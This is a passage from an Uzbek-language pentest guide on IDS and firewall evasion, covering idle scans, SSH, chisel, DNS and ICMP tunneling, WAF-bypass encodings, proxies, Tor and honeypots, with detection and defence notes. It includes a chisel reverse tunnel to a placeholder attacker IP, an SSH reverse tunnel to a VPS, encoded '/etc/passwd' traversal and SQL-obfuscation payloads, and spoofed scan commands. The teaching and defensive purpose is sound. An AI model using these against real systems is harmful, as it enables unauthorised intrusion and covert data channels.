<defs>
<marker id="ar" markerheight="7" markerwidth="7" orient="auto-start-reverse" refx="9" refy="5" viewbox="0 0 10 10"><path d="M0,0 L10,5 L0,10 z" fill="#344054"></path></marker>
<marker id="arr" markerheight="7" markerwidth="7" orient="auto-start-reverse" refx="9" refy="5" viewbox="0 0 10 10"><path d="M0,0 L10,5 L0,10 z" fill="#b42318"></path></marker>
</defs>
<rect fill="#0f766e" height="28" rx="5" width="110" x="40" y="6"></rect><text fill="#fff" font-weight="bold" text-anchor="middle" x="95" y="25">Hujumchi</text>
<rect fill="#0f766e" height="28" rx="5" width="110" x="285" y="6"></rect><text fill="#fff" font-weight="bold" text-anchor="middle" x="340" y="25">Zombi</text>
<rect fill="#0f766e" height="28" rx="5" width="110" x="530" y="6"></rect><text fill="#fff" font-weight="bold" text-anchor="middle" x="585" y="25">Nishon</text>
<line stroke="#98a2b3" stroke-dasharray="4 3" x1="95" x2="95" y1="34" y2="300"></line>
<line stroke="#98a2b3" stroke-dasharray="4 3" x1="340" x2="340" y1="34" y2="300"></line>
<line stroke="#98a2b3" stroke-dasharray="4 3" x1="585" x2="585" y1="34" y2="300"></line>
<text fill="#0f766e" font-weight="bold" x="4" y="62">1</text>
<line marker-end="url(#ar)" stroke="#344054" x1="95" x2="338" y1="58" y2="58"></line>
<text text-anchor="middle" x="217" y="53">SYN/ACK</text>
<line marker-end="url(#ar)" stroke="#344054" x1="338" x2="97" y1="84" y2="84"></line>
<text text-anchor="middle" x="217" y="79">RST, IPID = 1000</text>
<text fill="#0f766e" font-weight="bold" x="4" y="122">2</text>
<line marker-end="url(#arr)" stroke="#b42318" stroke-dasharray="6 3" x1="95" x2="583" y1="118" y2="118"></line>
<text fill="#b42318" text-anchor="middle" x="340" y="112">SYN, manba = Zombi IP (soxta)</text>
<line marker-end="url(#ar)" stroke="#344054" x1="583" x2="342" y1="146" y2="146"></line>
<text text-anchor="middle" x="462" y="141">SYN/ACK (port ochiq)</text>
<line marker-end="url(#ar)" stroke="#344054" x1="342" x2="583" y1="172" y2="172"></line>
<text text-anchor="middle" x="462" y="167">RST, IPID = 1001</text>
<text fill="#0f766e" font-weight="bold" x="4" y="210">3</text>
<line marker-end="url(#ar)" stroke="#344054" x1="95" x2="338" y1="206" y2="206"></line>
<text text-anchor="middle" x="217" y="201">SYN/ACK</text>
<line marker-end="url(#ar)" stroke="#344054" x1="338" x2="97" y1="232" y2="232"></line>
<text text-anchor="middle" x="217" y="227">RST, IPID = 1002</text>
<rect fill="#f0f9f8" height="70" rx="6" stroke="#b2dfdb" width="600" x="40" y="250"></rect>
<text fill="#0f766e" font-weight="bold" x="54" y="270">Xulosa: 1002 − 1000 = 2 → port OCHIQ</text>
<text x="54" y="288">Port yopiq bo‘lsa: nishon zombiga RST yuboradi, zombi javob bermaydi → farq 1 (closed|filtered).</text>
<text x="54" y="305">Farq 2 dan katta bo‘lsa: zombi boshqa trafik bilan band, natija ishonchsiz.</text>
</svg>
<figcaption style="font-size:0.85em;color:#475467;margin-top:8px">2-chizma. Idle skan: nishon faqat zombi IP’sini ko‘radi.</figcaption>
</figure>

```bash
# 1) Zombi nomzodini tekshirish
sudo nmap --script ipidseq -p 80 <zombi>          # "Incremental!" — mos
sudo hping3 -S -p 80 -c 5 -r <zombi>              # id=+1 ketma-ket bo‘lsa — mos
# 2) Idle skan (o‘z IP’ingizdan ping yubormaslik uchun -Pn shart)
sudo nmap -Pn -sI <zombi>:80 -p 22,80,443,445 <nishon>
```

- **Zombiga talablar:** global, ketma-ket oshadigan IPID; trafigi kam (bo‘sh); sizdan va nishondan yetib boriladigan. Zamonaviy Linux, Windows va BSD IPID’ni tasodifiy yoki manzil bo‘yicha alohida hisoblaydi, shuning uchun yaxshi zombilar odatda printerlar, IoT, eski tizimlar.
- **Haqiqiy kuchi — ishonch munosabatlarini xaritalash.** Nishon firewall’i ichki printerga 445-portni ochib qo‘ygan, sizga esa yopgan bo‘lsa, idle skan printer «ko‘radigan» portlarni ko‘rsatadi. Natija zombining nuqtai nazaridan.

**[ANIQLASH]** Nishon IDS’i zombi IP’dan skan ko‘radi. Zombining o‘zida esa so‘ralmagan SYN/ACK’lar oqimi va ularga RST javoblari paydo bo‘ladi; zombi tarmog‘ini kuzatgan himoyachi haqiqiy manbani topadi. **[HIMOYA]** tasodifiy IPID, printer va IoT’ni alohida VLAN’da saqlash, ingress filtrlash (soxta ichki manbali tashqi paketlar).

### 8.4 Soxtalashtirishni aniqlash

#### TTL va hoplar soni

Boshlang‘ich TTL odatda 64 (Linux, macOS), 128 (Windows) yoki 255 (tarmoq qurilmalari, ayrim Unix). Hoplar soni = boshlang‘ich TTL − kuzatilgan TTL. Shubhali paketdagi manba IP’ga ping yoki TCP probe yuboring: javobdagi hoplar soni kuzatilgan paketnikidan farq qilsa, bu qo‘shimcha tekshiruv uchun belgi. Boshlang‘ich TTL va marshrut o‘zgarishi mumkinligi sababli bitta tafovut soxtalashtirishni isbotlamaydi. Jin, Wang va Shin (2003) taklif qilgan *hop-count filtering* shu g‘oyani tizimlashtiradi: har bir manba tarmog‘i uchun odatiy hop soni jadvali yuritiladi.

#### IP identifikatori (IPID)

Ketma-ket IPID ishlatadigan tizimlarda shubhali paket va probe’ga kelgan javobning IPID qiymatlari yaqin bo‘lishi kutiladi. Bu faqat shunday tizimlar uchun to‘g‘ri; zamonaviy OS’larning ko‘pchiligida IPID tasodifiy.

#### TCP oqimini boshqarish va handshake

TCP qabul qiluvchi tomon qancha ma’lumot qabul qilishga tayyorligini oyna (window) orqali bildiradi; jo‘natuvchi shu chegarada har bir segment uchun ACK kutmasdan yuboradi. Manzilni soxtalashtirgan va javob yo‘lini ko‘rmaydigan jo‘natuvchi SYN/ACK’ni, ACK va oyna yangilanishlarini olmaydi, shuning uchun uch tomonlama handshake’ni yakunlay olmaydi (agar ISN’ni taxmin qila olmasa — RFC 6528). Oynadan tashqari segmentlar tekshirishga arziydi, lekin yolg‘iz o‘zi soxtalashtirishni isbotlamaydi.

#### Passiv OS fingerprint

Paket «Windows serverdan» kelgan, lekin TCP options va TTL Linux’nikiga o‘xshasa (p0f bunday nomuvofiqlikni ko‘rsatadi), manba shubhali.

### 8.5 Soxtalashtirishga qarshi choralar

| Chora | Mazmuni |
| --- | --- |
| **Ingress filtrlash (BCP 38, RFC 2827)** | Tarmoqqa tashqaridan ichki yoki rezerv qilingan manba manzili bilan kelgan paketlarni rad etish. Kirishni boshqarish ro‘yxatlari (ACL) bilan amalga oshiriladi. |
| **uRPF (BCP 84, RFC 3704)** | Paket manbasiga qaytish yo‘li shu interfeys orqali o‘tadimi, tekshiriladi. Cisco: `ip verify unicast source reachable-via rx`; Linux: `net.ipv4.conf.all.rp_filter=1` (qat’iy) yoki `2` (erkin). |
| **Egress filtrlash** | Ichkaridan faqat o‘z tarmog‘ingiz manzillari bilan paket chiqishiga ruxsat. Soxta manbali paketlar chiqishini to‘sadi; chiquvchi ulanishlarni cheklash zararli dastur ma’lumot yuborishini ham qiyinlashtiradi. |
| **Kuchli autentifikatsiya** | Faqat IP manzilga ishonmang, hatto ichki tarmoq yoki tanish kompyuterdan kelgan so‘rovga ham. Kalitli SSH, mTLS, Kerberos, imzolangan tokenlar. (OAuth asosan vakolat berish uchun; autentifikatsiya uchun OpenID Connect ishlatiladi.) |
| **Shifrlash** | IP sarlavhasida yolg‘on manzil yozishni shifrlashning o‘zi to‘xtatmaydi. Tomonlarning kimligini tekshiradigan himoyalangan kanal (TLS, IPsec) esa begona tomon ishonchli xizmat nomidan ish ko‘rishini qiyinlashtiradi. |
| **Taxmin qilib bo‘lmaydigan ISN va IPID** | TCP boshlang‘ich ketma-ketlik raqami RFC 6528 bo‘yicha generatsiya qilinishi kerak; vaqtga bog‘liq sodda hisoblagich taxmin qilishni osonlashtiradi. Eslatma: SYN segmentidagi ketma-ketlik raqami ISN, uni tasdiqlaydigan ACK qiymati ISN + 1. |
| **SYN cookies** | Soxta manbali SYN flood’ga qarshi: `net.ipv4.tcp_syncookies=1`. |

## 9\. Firewallni chetlab o‘tish: ishonch va tunnellash

Paket darajasidagi hiylalar odatda zamonaviy stateful firewall’ga qarshi ishlamaydi. Amalda firewall ko‘pincha *ruxsat etilgan* kanal orqali chetlab o‘tiladi: boshqa trafik o‘sha kanal ichiga joylanadi. Bu bo‘lim asosan ichki tarmoqqa kirib bo‘lingandan keyingi bosqichga (pivoting, egress) tegishli.

### 9.1 Chiqish siyosatini xaritalash

Ichki hostdan qaysi portlar tashqariga chiqishini aniqlash keyingi qadamni belgilaydi. Tashqarida barcha portlarda tinglaydigan o‘z test serveringiz bo‘lsa yaxshi:

```bash
for p in 21 22 25 53 80 123 443 445 993 3389 8080 8443; do
  nc -zvw2 <test-server> $p 2>&1 | grep -q succeeded && echo "TCP $p ochiq"
done
```

Natija odatda shunday bo‘ladi: faqat 80/443 proksi orqali, DNS faqat ichki resolver orqali. Aynan shu kanallar keyingi bo‘limlardagi tunnellar uchun asos.

### 9.2 IPv6 orqali

Ko‘p tarmoqlarda IPv4 qoidalari puxta, IPv6 esa unutilgan: hostlar SLAAC orqali avtomatik IPv6 manzil oladi va firewall’da IPv6 uchun qoidalar yo‘q yoki ruxsat beruvchi.

```bash
ping -6 -c 2 ff02::1%eth0                     # segmentdagi IPv6 hostlar
ip -6 neigh show
sudo nmap -6 -sS -p 22,445,3389 <ipv6-manzil>
```

**[HIMOYA]** IPv4 va IPv6 qoidalari pariteti; ishlatilmasa IPv6’ni nazorat ostida o‘chirish; RA Guard; IDS sensorlari IPv6’ni ham tahlil qilishi.

### 9.3 SSH tunnellash

```bash
ssh -L 8080:10.0.5.20:80 user@jump      # lokal: localhost:8080 → ichki veb-server
ssh -R 9001:127.0.0.1:22 user@vps       # teskari: tashqi VPS:9001 → ichki host SSH
ssh -D 1080 user@jump                   # dinamik SOCKS5 proksi (12-bo‘lim)
ssh -J user@jump user@10.0.5.20         # ProxyJump: oraliq host orqali
```

**[ANIQLASH]** uzoq davom etadigan va katta hajmli SSH seanslari; noodatiy manzillarga SSH; 443-portdagi SSH (NGFW App-ID protokol nomuvofiqligini ko‘radi); Zeek `ssh.log` va `conn.log`. **[HIMOYA]** tashqariga SSH’ni cheklash; serverlarda `AllowTcpForwarding no`, `PermitTunnel no`, `GatewayPorts no`; bastion orqali kirish va seanslarni yozib borish.

### 9.4 HTTP(S) va WebSocket tunnellash

Chiqishga faqat 80/443 ruxsat etilganda TCP trafigi HTTP yoki WebSocket ichiga joylanadi. OSCP va pivoting mashqlarida eng ko‘p ishlatiladigan vosita — chisel:

```bash
# Hujumchi tomonidagi server (tashqi):
chisel server --port 8000 --reverse
# Ichki hostdagi mijoz: serverda 127.0.0.1:1080 da SOCKS5 ochiladi
chisel client <hujumchi-ip>:8000 R:socks
```

Shunga o‘xshash vositalar: ligolo-ng (TUN interfeys orqali, marshrutga o‘xshash ishlaydi), korporativ proksi orqali HTTP CONNECT. **[ANIQLASH]** uzoq yashaydigan WebSocket/HTTPS seanslar, muntazam «yurak urishi» (beaconing), yangi yoki toifalanmagan domenlar, TLS mijoz fingerprintining (JA3/JA4) brauzerga mos kelmasligi. **[HIMOYA]** autentifikatsiyali chiqish proksisi, URL toifa filtri, TLS inspeksiya, yangi domenlarni bloklash yoki kuzatish.

### 9.5 DNS tunnellash

**[HUJUM]** Ma’lumot hujumchiga tegishli domenning subdomen nomlariga kodlanadi (har bir yorliq 63 belgigacha, to‘liq nom 253 belgigacha). Ichki resolver so‘rovni rekursiv ravishda hujumchining avtoritativ serveriga yetkazadi, javob TXT, NULL yoki CNAME yozuvlarida qaytadi. Shuning uchun usul faqat ichki DNS resolveri ruxsat etilgan tarmoqlarda ham ishlaydi. Vositalar: iodine (DNS ustidan IP, TUN interfeys bilan), dnscat2 (boshqaruv kanali). O‘tkazuvchanlik past, shovqin esa yuqori.

**[ANIQLASH]** bitta domenga juda ko‘p so‘rov; uzun va yuqori entropiyali subdomenlar; noyob subdomenlar soni; TXT/NULL yozuvlarining g‘ayritabiiy ulushi; ko‘p NXDOMAIN. Manbalar: Zeek `dns.log`, resolver loglari, RITA kabi beaconing tahlil vositalari. **[HIMOYA]** faqat ichki resolverlar; tashqariga to‘g‘ridan-to‘g‘ri 53-port yopiq; DNS firewall (RPZ); yangi ro‘yxatdan o‘tgan domenlarni bloklash.

### 9.6 ICMP tunnellash

Ma’lumot ICMP echo request/reply paketlarining payload qismida tashiladi (masalan, ptunnel-ng TCP’ni ICMP ustidan o‘tkazadi). **[ANIQLASH]** echo payload hajmi odatiy emas (Windows ping’i odatda 32 bayt alifbo naqshi, Linux ping’i 56 bayt); so‘rov va javob payloadlari bir xil emas; yuqori hajm va uzoq davomiylik. **[HIMOYA]** tashqariga ICMP’ni cheklash yoki payload hajmini chegaralash.

### 9.7 Zamonaviy ko‘rinmaslik muammolari

| Texnologiya | Himoyachi uchun nima o‘zgaradi | Tipik javob |
| --- | --- | --- |
| **DoH / DoT** | DNS so‘rovlari HTTPS (443) yoki TLS (853) ichida; DNS filtri va loglari ularni ko‘rmaydi. | Ma’lum DoH provayderlarini bloklash; Firefox uchun `use-application-dns.net` «canary» domeni; korporativ siyosat orqali o‘chirish. |
| **QUIC / HTTP/3** | UDP/443 ustida shifrlangan transport; ko‘p eski firewall/IPS ichini tahlil qila olmaydi. | UDP/443’ni bloklab, brauzerlarni TCP/TLS’ga qaytarish yoki QUIC’ni qo‘llab-quvvatlaydigan inspeksiya. |
| **ECH** | TLS ClientHello’dagi SNI shifrlanadi; SNI’ga asoslangan URL filtrlash zaiflashadi. | DNS siyosati, TLS inspeksiya, endpoint darajasidagi nazorat. |
| **Domain fronting** | TLS’dagi domen bilan HTTP Host sarlavhasi farq qiladi (CDN orqali). | Yirik CDN’lar asosan bloklagan; TLS inspeksiyada Host va SNI’ni solishtirish. |

### 9.8 Xulosa jadvali

| Kanal | Vositalar | Aniqlash belgisi | Himoya |
| --- | --- | --- | --- |
| SSH | ssh -L/-R/-D, sshuttle | Uzoq, katta seanslar; port/protokol nomuvofiqligi | Chiqishni cheklash, forwarding’ni o‘chirish |
| HTTP(S)/WS | chisel, ligolo-ng | Beaconing, JA3/JA4, yangi domenlar | Auth proksi, TLS inspeksiya |
| DNS | iodine, dnscat2 | Uzun/entropiyali so‘rovlar, hajm, TXT/NULL | Ichki resolver, RPZ, analitika |
| ICMP | ptunnel-ng | Payload hajmi va mazmuni | ICMP cheklovi |
| IPv6 | oddiy vositalar | IPv6 trafik kutilmagan joyda | Paritet, RA Guard |

## 10\. Ilova darajasida obfuskatsiya

Imzo baytlar ketma-ketligiga qaraydi, ilova esa dekodlangan *ma’noga*. Agar IDS/WAF va backend bitta so‘rovni turlicha dekodlasa yoki normalizatsiya qilsa (parser differential), bir xil ma’noli hujum imzoga mos kelmaydigan ko‘rinishda yetkaziladi. Bu bo‘limning amaliy qiymati — himoyachining normalizatsiyasi to‘g‘ri sozlanganini sinash.

### 10.1 HTTP va URL usullari

| Usul | Misol | Izoh |
| --- | --- | --- |
| URL kodlash | `/%65%74%63/%70%61%73%73%77%64` | `/etc/passwd`; IDS dekodlamasa imzo ishlamaydi. |
| Ikki karra kodlash | `%252e%252e%252f` | Ikki marta dekodlansa `../`. Backend ikki marta dekodlasa xavfli. |
| Overlong UTF-8 | `%c0%af` | Noto‘g‘ri, lekin ayrim eski dekoderlar `/` deb o‘qigan (IIS Unicode, CVE-2000-0884). |
| IIS `%u` kodlash | `%u002e%u002e/` | Faqat IIS’ga xos sintaksis. |
| Yo‘l hiylalari | `/./admin`, `//admin`, `/x/../admin`, `\admin` | Normalizatsiya qilinmasa, «/admin» imzosi ishlamaydi; Windows’da teskari slash. |
| Katta-kichik harf | `/ADMIN`, `SeLeCt` | Harfga befarq serverlar va SQL kalit so‘zlari. |
| SQL izohlari | `UN/**/ION SE/**/LECT` | Bo‘sh joy o‘rniga izoh. |
| HTTP Parameter Pollution | `?id=1&id=2` | Turli platformalar birinchisini, oxirgisini yoki ikkalasini birlashtirib oladi. |
| Chunked kodlash | `Transfer-Encoding: chunked` | Payload bir necha chunk’ga bo‘linadi. |
| Request smuggling | CL.TE / TE.CL nomuvofiqligi | Frontend va backend so‘rov chegarasini turlicha aniqlaydi (PortSwigger tadqiqotlari). |

Bu naqshlar WAF sinovida qo‘llanadi: har bir variantni yuborib, qaysi biri bloklanishini va qaysi biri o‘tib ketishini qayd etasiz. O‘tib ketganlari — hisobotdagi topilma va normalizatsiya sozlamasiga tavsiya.

### 10.2 Nikto’dagi evasion rejimlari

Nikto’da libwhisker merosidan qolgan `-evasion` parametri bor; bir nechta rejim birga berilishi mumkin:

| Kod | Usul | Kod | Usul |
| --- | --- | --- | --- |
| 1 | Tasodifiy URI kodlash | 6 | So‘rovda TAB ajratuvchi |
| 2 | Katalogga o‘z-o‘ziga murojaat (`/./`) | 7 | URL harflari registrini o‘zgartirish |
| 3 | URL’ni muddatidan oldin tugatish | 8 | Windows katalog ajratuvchisi (`\`) |
| 4 | Uzun tasodifiy satr qo‘shish | A | Ajratuvchi sifatida carriage return |
| 5 | Soxta parametr | B | Ajratuvchi sifatida 0x0b bayti |

```bash
nikto -h http://10.10.10.20 -evasion 1         # bitta rejim
nikto -h http://10.10.10.20 -evasion 1278      # bir nechta rejim
```

Nikto o‘zi juda shovqinli va standart User-Agent’ida o‘z nomini yuboradi. Laboratoriyada baseline’ni evasion rejimlari bilan solishtirish uchun ideal: qaysi rejim IDS’ning HTTP normalizatsiyasidan o‘tishini ko‘rasiz.

### 10.3 Payload obfuskatsiyasi va uning chegaralari

- **Polimorfizm:** har bir nusxada baytlar boshqacha, xatti-harakat bir xil.
- **Kodlash va shifrlash:** payload kodlangan holda yuboriladi, faqat hostda ochiladi.
- **ASCII/alfanumerik kod:** faqat chop etiladigan belgilarni o‘tkazadigan filtrlar uchun.

Muhim xulosa: zamonaviy himoya bu usullarga tarmoqda emas, hostda javob beradi. Dekoder qismlarining o‘zi imzoga aylangan; EDR, sandbox va AMSI kabi mexanizmlar baytlarni emas, xatti-harakatni kuzatadi. Shuning uchun faqat NIDS imzolariga tayanadigan himoya bu toifaga qarshi yetarli emas — bu bo‘limning asosiy himoya xabari.

### 10.4 Shifrlash va ko‘rinmaslik

HTTPS xizmatiga yuborilgan eksploit NIDS uchun ko‘rinmas: u faqat TLS seansini ko‘radi. Himoya variantlari: TLS’ni reverse proxy yoki WAF’da tugatib, sensorni undan keyin joylashtirish; TLS inspeksiya; host darajasidagi monitoring. TLS inspeksiyada vakolatli vosita mijoz bilan bir TLS ulanishini, server bilan ikkinchisini o‘rnatadi; buning uchun mijoz inspeksiya vositasining sertifikatiga ishonishi kerak. Bank va tibbiyot kabi toifalar odatda maxfiylik va qonun talablari sababli istisno qilinadi; sertifikat pinning qiladigan ilovalar buziladi.

Muqobil usul — tarmoq trafigini tahlil qilish (NTA): shifrlangan mazmun o‘rniga metama’lumotlarni (hajm, vaqt, yo‘nalish, JA3/JA4, sertifikat) va qurilmaning xatti-harakatini o‘rganib, shubhali aloqalarni ajratadi.

> 🛡️ **HIMOYA: NORMALIZATSIYA**
>
> - **Suricata (libhtp):** server turiga mos `personality` (IIS_7_0, Apache_2…), `double-decode-path`, `double-decode-query`, `u-encoding-decode`; HTTP anomaliyalari uchun `http-events.rules`.
> - **Snort 3:** `http_inspect` UTF-8, IIS Unicode va ikki karra kodlashni normalizatsiya qiladi va ular haqida alert beradi.
> - **WAF (ModSecurity + OWASP CRS):** paranoia darajalari (1–4), anomaliya balli rejimi, `t:urlDecodeUni`, `t:lowercase`, `t:normalizePath`, `t:removeComments` transformatsiyalari.
> - **Ilovaning o‘zida:** parametrlashtirilgan so‘rovlar, kanonik yo‘llar, kirishni bir marta dekodlash. WAF — qo‘shimcha qatlam, asosiy himoya emas.
>

## 11\. Yuk va shovqin orqali ko‘rinmaslik: tahdid va himoya

Bu bo‘lim hujum retsepti emas, balki himoyachi bilishi kerak bo‘lgan **tahdid modeli**: IDS/IPS imzo aniqligiga emas, o‘z resurslari va SOC e’tiborining cheklanganligiga ham bog‘liq. Pentest hisobotida bu bo‘lim «sensor chidamliligi» bo‘limini to‘ldiradi.

### 11.1 Nega bu muhim

Har bir sensorning chekli resurslari bor: oqim va fragment jadvallari uchun xotira (memcap), protsessor vaqti, log diski, va eng muhimi — SOC tahlilchisining diqqati. Evasion faqat «paketni imzodan yashirish» emas: haqiqiy signalni shovqin orasiga ko‘mib yuborish yoki sensorni paket tashlashga majburlash ham amalda xuddi shunday natija (false negative) beradi. 1-bo‘limdagi base-rate muammosi shuning nazariy asosi.

### 11.2 Himoyachi kuzatishi kerak bo‘lgan holatlar

| Xavf | Belgisi va javobi |
| --- | --- |
| **Resurs charchoqligi** (oqim/fragment jadvali, PCRE yuki, log diski) | Sensorning o‘z sog‘lig‘i ko‘rsatkichlarini kuzating: Suricata `stats.log`/`capture.kernel_drops`, Zeek `capture_loss.log`, memcap va CPU bandligi. Drop ko‘rsatkichining o‘zi xavfsizlik alertiga aylanishi kerak. |
| **Fail-open xavfi** | Inline IPS yuklama ostida trafikni tekshiruvsiz o‘tkazishini aniqlang va ongli tanlov qiling (biznes uzluksizligi vs xavfsizlik); kritik segmentlarda fail-closed. |
| **Alert bo‘roni (alert fatigue)** | Ko‘p sonli bir xil alert — ehtimol asl hujumni yashirish uchun. Alert korrelyatsiyasi, deduplikatsiya, triaj avtomatizatsiyasi (SOAR); bir manbadan kelgan alert portlashini alohida qoida bilan belgilang. |
| **Tarixiy vositalar** (soxta alert generatorlari — Stick, Snot kabi) | Bu eski vositalarning o‘zi hozir kam ishlaydi, lekin g‘oyasi qoladi: imzolar mazmun tasdig‘isiz ishga tushmasligi kerak. Suricata/Snort’da oqim holati va to‘liq qayta yig‘ishga tayangan qoidalardan foydalaning; «stateless» imzolarni minimallashtiring. |

> 🛡️ **HIMOYA: SENSOR CHIDAMLILIGI**
>
> - Memcap va timeout’larni tarmoq hajmiga moslab o‘lchamlang; standart qiymatlarga tayanmang.
> - Sensor telemetriyasini (drop, CPU, xotira) SIEM’ga uzating va unga alert qo‘ying — ko‘r bo‘lib qolgan sensor eng xavfli holat.
> - Qoidalarni oqim qayta yig‘ishga tayantiring; og‘ir PCRE qoidalarini profil qilib, optimallang.
> - Alert korrelyatsiyasi va tezlik chegaralari bilan shovqinni haqiqiy signaldan ajrating.
> - Ikki qatlamli himoya: NIDS ko‘r bo‘lsa ham HIDS/EDR hostda ko‘radi.
>

> ⚖️ **AMALIY CHEGARA**
>
> Ishlab turgan IDS/IPS yoki tarmoqni ataylab ishdan chiqarishga qaratilgan yuklama hujumlari — mohiyatan DoS. Ular faqat scope’da aniq yozilgan va mijoz yozma ruxsat bergan test oynasida, odatda ishlab chiqarishdan ajratilgan nusxada bajariladi. Ruxsatsiz yoki ishlab chiqarish muhitida bu xizmatni buzadi va huquqiy javobgarlikka olib keladi (0-bo‘lim). Shuning uchun bu qo‘llanma bu yerda operatsion retsept bermaydi — e’tibor sensor chidamliligini o‘lchash va mustahkamlashga qaratilgan.
>

## 12\. Proksilar va anonimlik

Proksi ulanishni o‘zi orqali uzatadi: nishon proksining IP’sini ko‘radi, sizning haqiqiy manzilingizni emas. Proksilar manbani yashirish, geografik cheklovlarni chetlab o‘tish va ba’zan filtrlardan o‘tishda ishlatiladi, lekin kechikishni oshirib, skan tezligini kamaytiradi.

### 12.1 Proksi turlari

| Turi | Qatlam va xususiyati |
| --- | --- |
| **HTTP** | Faqat HTTP so‘rovlari; mazmunni ko‘radi va o‘zgartirishi mumkin. |
| **HTTP CONNECT** | Istalgan TCP portga tunnel (asosan HTTPS uchun); proksi faqat ulanishni o‘tkazadi. |
| **SOCKS4** | TCP ulanishlari; DNS’ni o‘zi hal qilmaydi (mijoz hal qiladi). |
| **SOCKS5** | TCP va UDP; autentifikatsiya; **DNS’ni proksi tomonida hal qilish** mumkin (DNS sizib chiqishining oldini oladi). |
| **Shaffof (transparent)** | Foydalanuvchi bilmasdan trafikni yo‘naltiradi; korporativ tarmoqlarda keng tarqalgan. |

### 12.2 ProxyChains

ProxyChains (proxychains-ng) istalgan TCP ilovasini proksi zanjiri orqali o‘tkazadi. Kali’da sozlama fayli odatda `/etc/proxychains4.conf`.

```bash
# /etc/proxychains4.conf
dynamic_chain          # ishlamayotgan proksini o‘tkazib yuboradi (strict_chain — qat’iy tartib)
proxy_dns              # DNS’ni zanjir orqali hal qiladi — leakni oldini oladi
[ProxyList]
socks5  127.0.0.1 9050     # Tor (quyida)
socks5  127.0.0.1 1080     # SSH -D yoki chisel ochgan SOCKS
```

```bash
proxychains -q nmap -sT -Pn -n -p 80,443 10.0.5.20
proxychains -q curl -s https://ifconfig.me
```

> ⚠️ **PROKSI VA NMAP: MUHIM CHEKLOV**
>
> - ProxyChains faqat **TCP connect** (`-sT`) bilan ishlaydi; SYN (`-sS`) va boshqa raw skanlar operatsion tizim soketini chetlab o‘tgani uchun proksidan o‘tmaydi. Shuning uchun proksi ortidan `-sT -Pn -n` ishlating.
> - Nmap’ning o‘z `--proxies` parametri faqat NSE va versiya skanini proksidan o‘tkazadi; ping, port skan va OS aniqlash sizning haqiqiy IP’ingizdan ketadi. Ya’ni `--proxies` port skanini anonimlashtirmaydi.
> - UDP skan HTTP/SOCKS4 proksi orqali o‘tmaydi; faqat SOCKS5 UDP’ni qo‘llaydi, u ham cheklangan.
> - Ishonchsiz ommaviy proksilardan foydalanmang: ular trafikni yozib olishi yoki o‘zgartirishi mumkin. Laboratoriyada o‘zingiz boshqaradigan proksi ishlating.
>

### 12.3 Tor

Tor (The Onion Router) trafikni ko‘ngilli relaylar tarmog‘i orqali bir necha qatlam shifr («piyoz») bilan uzatadi. Har bir relay faqat oldingi va keyingi tugunni biladi, butun yo‘lni emas. Oddiy ulanish uch relaydan o‘tadi: kirish (guard), o‘rta va chiqish (exit). Onion xizmatiga ulanishda yo‘l uzunroq bo‘ladi (har ikki tomon uch relaydan — jami olti relay atrofida), negaki na mijoz, na xizmat bir-birining IP’sini bilmaydi.

```bash
sudo systemctl start tor            # SOCKS5 127.0.0.1:9050 da ochiladi
torsocks curl -s https://check.torproject.org/api/ip
proxychains -q curl -s https://ifconfig.me
```

- **Chiqish tuguni** shifrlanmagan trafikni ko‘radi: Tor ustidan ham faqat HTTPS ishlating.
- Tor TCP uchun; UDP’ni tashimaydi, shuning uchun UDP skan va to‘g‘ridan-to‘g‘ri DNS o‘tmaydi (`proxy_dns` yoki Tor’ning o‘z DNS porti kerak).
- Tor orqali skan sekin va tashqi xizmatlar uchun shovqinli; ko‘p saytlar chiqish tugunlarini bloklaydi.
- Tor IP’lari ommaviy ro‘yxatda (chiqish tugunlari), shuning uchun himoyachi ularni osongina belgilaydi.

### 12.4 Boshqa anonimlik vositalari

| Vosita | Qisqacha |
| --- | --- |
| **I2P** | Yopiq, o‘z ichidagi xizmatlarga yo‘naltirilgan tarmoq; bir yo‘nalishli tunnellar. |
| **VPN** | Butun trafikni shifrlangan tunnel orqali bitta chiqish nuqtasiga uzatadi. Tordan farqli: provayder manbani biladi (log siyosatiga ishonch kerak). |
| **Tails** | USB’dan ishga tushadigan, butun trafikni Tor orqali o‘tkazadigan amnestik tizim. Rasmiy sayt: `tails.net`. |
| **Whonix** | Ikki virtual mashina: gateway (Tor) va ish stansiyasi; IP leak’ni arxitektura darajasida to‘sadi. |
| **Psiphon** | Senzurani chetlab o‘tish vositasi (`psiphon.ca`); anonimlik emas, kirishni ta’minlash uchun. |

> ℹ️ **OPSEC ESLATMA**
>
> Anonimlik — bitta vosita emas, butun zanjir masalasi. Haqiqiy manzilni bitta DNS so‘rovi, WebRTC leak, brauzer fingerprinti yoki anonim va shaxsiy hisobni bir seansda aralashtirish fosh qiladi. Pentestda esa odatda anonimlik *kerak emas*: siz ruxsat bilan ishlaysiz va mijoz sizning test IP’ingizni oldindan biladi (allowlist). Anonimlik vositalari bu yerda asosan «tashqi hujumchi qanday yashirinadi» stsenariysini modellashtirish va IP-reputatsiya himoyasini sinash uchun.
>

## 13\. Honeypot va yolg‘on infratuzilma (deception)

Honeypot — ataylab zaif yoki jozibali qilib qo‘yilgan, hech qanday qonuniy vazifasi bo‘lmagan tizim. Unga har qanday murojaat ta’rifiga ko‘ra shubhali, shuning uchun honeypot alertlari kam yolg‘on signalli bo‘ladi. Honeypotlar himoya vositasi, lekin pentester ularni tanib, chetlab o‘tishi va hisobotda deception qamrovini baholashi kerak.

### 13.1 Turlari

| Turi | Tavsif |
| --- | --- |
| **Past interaktivlik** | Xizmatni taqlid qiladi (ochiq port, banner), lekin to‘liq emas. Masalan, Honeyd, Cowrie (SSH/Telnet). |
| **Yuqori interaktivlik** | Haqiqiy OS va xizmatlar; hujumchi xatti-harakatini to‘liq kuzatish uchun, lekin boshqarish murakkab. |
| **Honeynet** | Bir nechta honeypotdan iborat, kuzatuv ostidagi butun soxta tarmoq. |
| **Honeytoken** | Soxta hisob, fayl, API kalit yoki DB yozuvi; ulardan foydalanilsa alert chiqadi (masalan, canarytokens). |
| **Tarqoq deception (DDP)** | Haqiqiy tarmoqqa soxta kredensial, ulanish va xizmatlar sepib, lateral movement’ni erta aniqlash. |

### 13.2 Honeypotni tanish belgilari

- Haddan tashqari ko‘p va «chiroyli» ochiq portlar; bir xil bannerli, lekin xatti-harakati to‘liq emas xizmatlar.
- Xizmat versiyasi bannerda bor, lekin unga xos keyingi bosqich javoblari yo‘q (protokolning chuqur so‘rovlariga noto‘g‘ri javob).
- Barcha xizmatlar bitta OS fingerprintini beradi, real xizmatlar esa turlicha.
- Virtualizatsiya izlari, g‘ayritabiiy past tarmoq kechikishi, «juda oson» zaifliklar.
